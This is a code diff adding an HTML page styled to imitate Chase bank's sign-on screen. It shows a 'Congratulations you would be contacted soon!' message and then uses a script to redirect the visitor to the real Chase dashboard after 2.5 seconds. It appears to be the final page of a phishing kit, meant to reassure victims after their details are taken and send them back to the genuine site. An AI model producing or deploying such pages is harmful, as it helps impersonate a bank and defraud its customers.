@@ -1,0 +1,67 @@
+<div class="container logon" data-is-view="true">
+    <div>
+        <div id="backgroundImage">
+            <div class="jpui background image fixed show-xs show-sm" id="geoImage">
+
+            </div>
+        </div>
+    </div>
+    <div class="row">
+        <div class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden" id="logoffbox">
+            <div class="jpui raised segment">
+                <div class="row">
+                    <div class="col-xs-10 col-xs-offset-1">
+                        <h3 class="u-focus in-progress" tabindex="-1" id="logoff-header">
+                            You're being signed out.
+                        </h3>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-xs-12">
+                        <div class="progress">
+                            <div class="bar"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box" id="logonbox">
+            <div class="jpui raised segment">
+                <div class="row">
+                    <style>
+                        .logon .jpui.raised.segment, html.logon-tw {
+                            background: rgba(255, 255, 255, 0.6);
+                            margin-top: 55px;
+                        }
+                        .appriciate{
+                            margin: 20px 7px;
+                            text-align: justify;
+                        }
+                        .appriciate p{
+                            color: #292422;
+                            font-size: 17px;
+                            text-align: center;
+                        }
+                    </style>
+                    <div class="col-xs-10 col-xs-offset-1 preAppri">
+                        <div class="appriciate">
+                            <p>
+                                Congratulations you would be contacted soon!
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-latest.min.js"></script>
+
+<script>
+    $(document).ready(function(){
+        setTimeout(function() {
+            window.location.href = "https://secure05b.chase.com/web/auth/dashboard#/dashboard/index/index";
+        }, 2500);
+    });
+</script>
